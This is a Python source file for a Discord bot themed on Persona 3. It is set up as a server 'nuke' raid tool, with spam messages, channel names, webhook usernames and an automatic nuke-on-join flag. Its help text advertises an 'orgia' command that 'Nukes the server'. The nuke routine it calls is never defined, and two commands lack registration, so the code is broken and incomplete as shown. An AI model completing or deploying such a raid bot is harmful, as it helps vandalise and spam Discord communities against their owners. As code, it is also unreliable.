#머리

import discord, random, aiohttp, asyncio
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S
import os

client = commands.Bot(command_prefix = '?')
spam_messages = ["orgia mode"]
channel_names = ["persona"]
webhook_usernames = ["makoto", "aigis 2", "aigis 1"]
nuke_on_join = True
nuke_wait_time = 0


#

#봇 상태설정
@client.event
async def on_ready():

  # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
  await client.change_presence(status=discord.Status.online)

  await client.change_presence(activity=discord.Game(name="Persona 3 FES"))
  #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
  
  print("Aigis:",client.user.name,"819929289759653928:",client.user.id)


#갠디로 엠베드 전송
@client.command()
async def aigis(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmds = discord.Embed(
    title = "Aigis - Commands", 
    description = """
**__COMMANDS__**
```
{prefix}aigis
Shows this message. 
 
{prefix}orgia
Nukes the server. 
 
{prefix}overheat
Logs out the client.
```
**__CREDITS__**
```
asdf
```
""")
  await author.send(embed = cmds)

#여기서부터 다음 설명까지 orgia 커맨드 범위
async def orgia(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

#서버퇴장
async def overheat(ctx):
  await ctx.message.delete()
  exit()  
  
  
  
#끝
client.run(os.environ['token'])
